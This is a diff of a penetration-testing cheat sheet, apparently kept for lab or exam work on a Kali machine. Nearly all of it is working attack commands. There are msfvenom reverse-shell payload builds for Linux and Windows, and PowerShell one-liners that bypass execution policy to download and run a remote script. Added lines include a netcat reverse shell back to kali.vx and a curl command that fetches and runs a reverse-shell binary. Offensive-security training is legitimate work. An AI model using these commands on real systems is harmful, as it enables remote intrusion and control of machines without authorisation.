@@ -25,13 +25,17 @@ If Kali isn't setup as web server, use `python3 -m http.server 80 &> /dev/null &
 cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe /var/www/html
 ```
 
-### Linux reverse shell TCP:
+### MSFVenom reverse shell TCP:
+
+☝️ omit the `x64` to generate a x86 payload
+
+Linux:
 
 ```console
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f py -o /var/www/html/reverse.py
 ```
 
-### Windows reverse shell TCP:
+Windows:
 
 ```console
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f exe -o /var/www/html/reverse.exe
@@ -54,7 +58,7 @@ sed -i 's/<PORT>/4444/' reverse.ps1
 
 # 2. Execute payloads on Windows
 
-## 2.1. Execute Windows reverse shell TCP
+## 2.1. Execute Windows reverse shell TCP payload
 
 ### Using certutil
 
@@ -76,4 +80,18 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Ne
 
 ```console
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://kali.vx/reverse.ps1')
+```
+
+# 3. Execute payloads on Linux
+
+## 3.1. Simply nc back (if netcat is installed on target machine)
+
+```console
+nc -nv kali.vx 4444 -e /bin/sh
+```
+
+### 3.2. Execute Linux reverse shell TCP payload
+
+```console
+curl -O http://kali.vx/reverse.elf && chmod +x reverse.elf && ./reverse.elf
 ```
